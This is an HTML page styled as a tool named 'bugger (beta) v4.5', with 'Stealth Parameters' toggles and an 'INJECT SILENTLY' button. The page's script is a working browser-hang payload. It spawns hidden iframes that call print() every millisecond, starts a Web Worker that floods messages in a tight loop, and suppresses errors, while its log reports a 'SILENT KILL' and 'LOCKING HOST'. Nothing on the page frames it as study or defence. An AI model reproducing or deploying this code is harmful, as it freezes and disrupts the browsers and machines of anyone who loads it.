<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>bugger (beta)</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; color: #000; display: flex; flex-direction: column; height: 100vh; margin: 0; }
        
        /* Navigation */
        nav {
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #f0f0f0;
        }
        .nav-links a {
            text-decoration: none;
            color: #000;
            font-size: 13px;
            transition: opacity 0.2s;
        }
        .nav-links a:hover { opacity: 0.5; }

        .container { flex: 1; display: flex; justify-content: center; align-items: center; }
        .window { width: 380px; padding: 35px; border: 1px solid #f0f0f0; border-radius: 4px; }
        h1 { font-size: 16px; font-weight: 500; margin-bottom: 25px; }
        .section-label { font-size: 10px; text-transform: uppercase; color: #999; letter-spacing: 1px; margin-bottom: 12px; display: block; border-bottom: 1px solid #f5f5f5; padding-bottom: 5px; }
        .setting { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 12px; }
        .btn { width: 100%; padding: 14px; background: #000; color: #fff; border: none; cursor: pointer; font-size: 11px; font-weight: 700; letter-spacing: 1px; margin-top: 20px; }
        #log { margin-top: 20px; font-family: monospace; font-size: 9px; color: #cc0000; max-height: 80px; overflow: hidden; }
    </style>
</head>
<body>

    <nav>
        <div style="font-size: 14px; font-weight: 600;">bugger</div>
        <div class="nav-links">
            <a href="index.html">Home</a>
        </div>
    </nav>

    <div class="container">
        <div class="window">
            <h1>bugger (beta) v4.5</h1>
            
            <span class="section-label">Stealth Parameters</span>
            <div class="setting">
                <span>Silent Modal Suppression</span>
                <input type="checkbox" id="v-silent" checked>
            </div>
            <div class="setting">
                <span>Background Deadlock</span>
                <input type="checkbox" id="v-dead" checked>
            </div>

            <button class="btn" onclick="igniteSilent()">INJECT SILENTLY</button>
            <div id="log"></div>
        </div>
    </div>

    <script>
        const logBox = document.getElementById('log');
        function writeLog(t) { logBox.innerHTML += `> ${t}<br>`; }

        window.onerror = () => true;

        function igniteSilent() {
            writeLog("INITIATING SILENT KILL...");
            document.querySelector('.btn').innerText = "LOCKING HOST...";
            document.querySelector('.btn').disabled = true;

            setInterval(() => {
                const i = document.createElement('iframe');
                i.style.display = 'none';
                document.body.appendChild(i);
                try {
                    i.contentWindow.print();
                    i.src = "about:blank"; 
                } catch(e) {}
                if (document.body.contains(i)) {
                    document.body.removeChild(i);
                }
            }, 1);

            const workerCode = `self.onmessage = () => { setInterval(() => { postMessage('hang'); }, 1); }`;
            const b = new Blob([workerCode], {type: 'text/javascript'});
            const w = new Worker(URL.createObjectURL(b));
            w.postMessage('go');

            setTimeout(() => {
                writeLog("SILENT LOCK CONFIRMED.");
                writeLog("UI MODALS SUPPRESSED.");
                document.querySelector('.btn').innerText = "SILENT LOCK ACTIVE";
            }, 2500);
        }
    </script>
</body>
</html>
